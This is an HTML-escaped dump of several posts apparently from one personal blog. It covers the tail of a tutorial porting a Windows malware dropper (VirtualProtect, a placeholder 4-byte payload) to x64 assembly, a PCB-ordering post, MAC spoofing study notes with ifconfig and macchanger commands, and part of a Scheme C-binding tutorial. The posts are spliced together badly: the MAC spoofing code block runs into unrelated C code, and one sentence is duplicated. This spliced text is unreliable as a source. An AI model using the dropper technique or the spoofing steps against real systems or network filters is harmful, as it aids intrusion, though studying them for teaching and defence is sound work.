&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;rv&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;VirtualProtect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;exec_mem&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;payload_len&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;PAGE_EXECUTE_READ&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;oldprotect&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;In assembly, we supply the parameters like so:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;;; Make new buffer as executable&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rcx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;exec_mem&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="c1"&gt;;; First parameter&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;xor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rdx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rdx&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;dl&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;payload_len&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;;; Second parameter&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;r8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0x20&lt;/span&gt;&lt;span class="w"&gt;             &lt;/span&gt;&lt;span class="c1"&gt;;; Third parameter&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;xor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;r9&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;r9&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;lea&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;r9&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;old_protect&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;;; Fourth parameter&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;sub&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="w"&gt;          &lt;/span&gt;&lt;span class="c1"&gt;;; Reserve shadow space&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;call&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;VirtualProtect&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="c1"&gt;;; Call function&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;add&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="w"&gt;          &lt;/span&gt;&lt;span class="c1"&gt;;; Release shadow space&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;For functions that require more than four parameters, the stack needs to be utilized. This can get confusing so let me point you to &lt;a href="https://sonictk.github.io/asm_tutorial/#windows:thewindowtothehardware/themicrosoftx64callingconvention"&gt;this post&lt;/a&gt; as it has diagrams for visualization.&lt;/p&gt;
&lt;h2 id="the-final-code"&gt;The final code&lt;/h2&gt;
&lt;p&gt;The rest of the code can be converted using the concepts I've described above. Here is the fully converted code:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;bits&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;64&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;default&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rel&lt;/span&gt;

&lt;span class="nf"&gt;segment&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;.data&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;msg_hello&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="no"&gt;db&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="no"&gt;Hello&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;world&lt;/span&gt;&lt;span class="p"&gt;!&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0xd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0xa&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;msg_exec_addr&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="no"&gt;db&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="no"&gt;exec_mem&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;addr&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;msg_pload_addr&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="no"&gt;db&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="no"&gt;payload&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;addr&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;msg_format&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="no"&gt;db&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;%&lt;/span&gt;&lt;span class="mi"&gt;-20&lt;/span&gt;&lt;span class="no"&gt;s&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="no"&gt;x&lt;/span&gt;&lt;span class="err"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;-016&lt;/span&gt;&lt;span class="no"&gt;p&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0xd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0xa&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;msg_hit_me&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="no"&gt;db&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="no"&gt;Hit&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;me&lt;/span&gt;&lt;span class="p"&gt;!&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0xd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0xa&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;;; 4 byte payload&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;payload&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="no"&gt;db&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;0x90&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0x90&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0xCC&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0xC3&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;As mentioned before, I did my best to match the structure of the C code to the assembly code to make it easy to compare how one section was translated to the other. There are other parts like the &lt;code&gt;jz ifrvzero&lt;/code&gt; conditonal jump that I didn't discuss, but those can be easily be understood if you know the basics in assembly.&lt;/p&gt;
&lt;p&gt;I've also uploaded the code on it's own repository &lt;a href="https://github.com/accidentalrebel/malware-dropper-x64-win-assembly"&gt;here&lt;/a&gt;. Updates and fixes to the code will be pushed there.&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;A lot of the concepts I've described in this post were the lessons I learned while working on this project. Most of these can be researched but I'm hoping that collecting them in one location would benefit the next bloke who is crazy like me to do the same.&lt;/p&gt;

&lt;p&gt;A couple of months ago I got an email from &lt;a href="https://www.pcbway.com/"&gt;PCBWay&lt;/a&gt; asking if I was interested in trying out their PCB manufacturing service. The email from PCBWay re-ignited this interest in having a PCB made. The problem is I didn't have a PCB design that I built myself that I knew was going to work.

The email from PCBWay re-ignited this interest in having a PCB made. The problem is I didn't have a PCB design that I built myself that I knew was going to work. My best option was the "ESPBoy project".&lt;/p&gt;
&lt;p&gt;The &lt;a href="https://hackaday.io/project/164830-espboy-the-ultimate-multi-gadget"&gt;ESPBoy&lt;/a&gt; is a project by &lt;a href="https://hackaday.io/ESPboy.edu"&gt;RomanS&lt;/a&gt; that is touted to be the ultimate multi-gadget. RomanS sent me a kit a long time ago (Thank's again, RomanS). I have assembled and &lt;a href="https://www.youtube.com/watch?v=GIrp5Vpr2Ns&amp;amp;feature=emb_title"&gt;made a tutorial video&lt;/a&gt; for it which means that I know that it works and have a very good idea of how it is laid out.&lt;/p&gt;
&lt;p&gt;With that decided, having the PCB made was a very easy and quick process. I just uploaded the gerber file on the PCBWay website, waited for the review of the PCB to be finished, and in a few hours I clicked the submit button and it was off to the printers.&lt;/p&gt;
&lt;p&gt;Fast forward a few weeks later and the package with the printed pcbs arrived.&lt;/p&gt;
&lt;p&gt;&lt;img alt="my-experience-manufacturing-printed-circuit-boards-02" src="https://www.accidentalrebel.com/images/my-experience-manufacturing-printed-circuit-boards-02.jpg" /&gt;&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;And yes, I changed the color to red just so they would look different.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;I must say that I am very impressed with the quality of the PCBs. The material feels really solid and the lines so fine and accurate. I've seen and held PCB etchings before, and this is like lightyears ahead in terms of quality. The same can be said with my hand soldered perfboards, of course.&lt;/p&gt;
&lt;p&gt;Sadly, these PCBs have been sitting in storage because I haven't found the time due to the baby. Thankfully, my schedule is slowly opening up recently and I plan to build one ESPBoy in the next coming weeks. I plan to remove the parts from the old one and put it on this. This newer PCB design has new features like the ability to connect to an app store (yeah, seriously) and I'm really curious to try it out.&lt;/p&gt;
&lt;p&gt;I also might consider having another PCB made, but this time with my own design. I'm thinking I might go ahead and have my TIRO watch made, or maybe something even simpler. We'll see.&lt;/p&gt;</content><category term="Misc"/><category term="pcbs"/><category term="electronics"/></entry><entry><title>Study notes: MAC Spoofing</title><link href="https://www.accidentalrebel.com/study-notes--mac-spoofing.html" rel="alternate"/><published>2020-08-01T11:07:00+08:00</published><updated>2020-08-01T11:07:00+08:00</updated><author><name>AccidentalRebel</name></author><id>tag:www.accidentalrebel.com,2020-08-01:/study-notes--mac-spoofing.html</id><summary type="html">&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Study notes are my personal research notes on certain topics that interests me.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Any network capable device has a unique factory-assigned Media Access Control (MAC) address. Users have no way to change the MAC address but it can be done. However, it is possible to mask the MAC address and have it show a different value. This is called MAC spoofing.&lt;/p&gt;
&lt;p&gt;There are legitimate uses for MAC spoofing. For example, there may be certain applications that require a particular MAC address to work, or maybe your ISP expects a certain MAC address to connect to the network. MAC spoofing is largely used for illegitimate uses, like circumventing an access control list or getting past a filter on a wireless network.&lt;/p&gt;
&lt;h2 id="changing-mac-address-via-ifconfig"&gt;Changing MAC Address via ifconfig&lt;/h2&gt;
&lt;p&gt;In Linux we could use &lt;code&gt;ifconfig&lt;/code&gt; to change the MAC address.&lt;/p&gt;
&lt;p&gt;To view the current MAC address:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;ifconfig
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The current MAC address is &lt;code&gt;08:00:27:59:fb:fa&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img alt="study-notes--mac-spoofing-01" src="https://www.accidentalrebel.com/images/study-notes--mac-spoofing-01.png" /&gt;&lt;/p&gt;
&lt;p&gt;Let's say we want to change the MAC address of our interface (eth0) to &lt;code&gt;00:11:22:33:44:55&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;First, deactivate the interface.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;ifconfig&lt;span class="w"&gt; &lt;/span&gt;eth0&lt;span class="w"&gt; &lt;/span&gt;down
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then we specify the mac address that we want to change to.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;ifconfig&lt;span class="w"&gt; &lt;/span&gt;eth0&lt;span class="w"&gt; &lt;/span&gt;hw&lt;span class="w"&gt; &lt;/span&gt;ether&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;00&lt;/span&gt;:11:22:33:44:55
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Reactive the interface:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;ifconfig&lt;span class="w"&gt; &lt;/span&gt;eth0&lt;span class="w"&gt; &lt;/span&gt;up
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Run &lt;code&gt;ifconfig&lt;/code&gt; again to see the changes.&lt;/p&gt;
&lt;p&gt;&lt;img alt="study-notes--mac-spoofing-02" src="https://www.accidentalrebel.com/images/study-notes--mac-spoofing-02.png" /&gt;&lt;/p&gt;
&lt;h3 id="note"&gt;NOTE:&lt;/h3&gt;
&lt;p&gt;These changes are not permanent. The MAC address will return to the original one when the system is restarted!&lt;/p&gt;
&lt;h2 id="changing-the-mac-address-via-macchanger"&gt;Changing the MAC address via MACChanger&lt;/h2&gt;
&lt;p&gt;There are various tools that allows easy changing of MAC addresses. &lt;a href="https://github.com/alobbs/macchanger"&gt;MACChanger&lt;/a&gt; is one of them.&lt;/p&gt;
&lt;p&gt;First, deactivate the interface.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;ifconfig&lt;span class="w"&gt; &lt;/span&gt;eth0&lt;span class="w"&gt; &lt;/span&gt;down
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The above below allows you specify the mac address you want to use:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;macchanger&lt;span class="w"&gt; &lt;/span&gt;-m&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;00&lt;/span&gt;:11:22:33:44:55&lt;span class="w"&gt; &lt;/span&gt;eth0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The code below assigns a random MAC address.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;macchanger&lt;span class="w"&gt; &lt;/span&gt;-r&lt;span class="w"&gt; &lt;/span&gt;eth0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Reactive the interface:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;ifconfig&lt;span class="w"&gt; &lt;/span&gt;eth0&lt;span class="w"&gt; &lt;/span&gt;up

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="kt"&gt;float&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="kt"&gt;float&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;z&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Vec3&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="n"&gt;Vec3&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;Vec3Create&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;float&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;float&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;float&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;z&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;Vec3&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Vec3&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;malloc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Vec3&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;z&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;z&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We could use &lt;a href="https://wiki.call-cc.org/man/5/Module%20(chicken%20foreign)#foreign-lambda"&gt;&lt;code&gt;foreign-lambda&lt;/code&gt;&lt;/a&gt; to bind to the function:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;define&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;vec3_create&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;foreign-lambda&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;c-pointer&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;struct&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Vec3&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="c1"&gt;; Return type, a pointer to a struct object of Vec3&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Vec3Create&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;                  &lt;/span&gt;&lt;span class="c1"&gt;; Name fo the function&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nv"&gt;float&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;float&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;float&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="c1"&gt;; The three parameters (x,y,z) to pass to the function&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This would allow us to call the &lt;code&gt;vec3_create&lt;/code&gt; function like so:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;vec3_create&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;1.1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;3.3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id="foreign-lambda-example_1"&gt;foreign-lambda* example&lt;/h2&gt;
&lt;p&gt;Let's bind another C function &lt;code&gt;Vec3Print&lt;/code&gt;.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;Vec3Print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Vec3&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Vec3 to print: (%f, %f, %f)&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;z&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
